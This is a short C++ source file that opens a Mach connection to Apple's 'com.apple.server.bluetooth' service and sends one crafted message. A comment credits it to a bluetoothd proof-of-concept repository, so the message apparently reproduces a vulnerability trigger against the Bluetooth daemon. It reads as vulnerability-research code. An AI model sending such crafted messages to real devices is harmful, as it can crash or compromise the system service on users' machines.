//
// Created by @RaniXCH on 2019-02-04.
//

#include "MachService.h"



MachService::MachService()
{
    this->setupMachService();
}

void MachService::setupMachService()
{
    this->machConnection = new MachConnection("com.apple.server.bluetooth");
}

// Based on the PoC - https://github.com/rani-i/bluetoothdPoC/blob/master/bluetoothdPoC/main.m
void MachService::playground()
{
    MachMessage machMessage = MachMessage(3+0xFA300, 0x1513);

    typedef struct msgData_t {
        char extraData[0x48 - sizeof(mach_msg_header_t)];
    } msgData;
    msgData messageData = msgData();

    MachMessageData machMessageData = MachMessageData(&messageData, sizeof(msgData));

    machMessage.addData(machMessageData);

    machMessage.sendMessage(*this->machConnection);


}
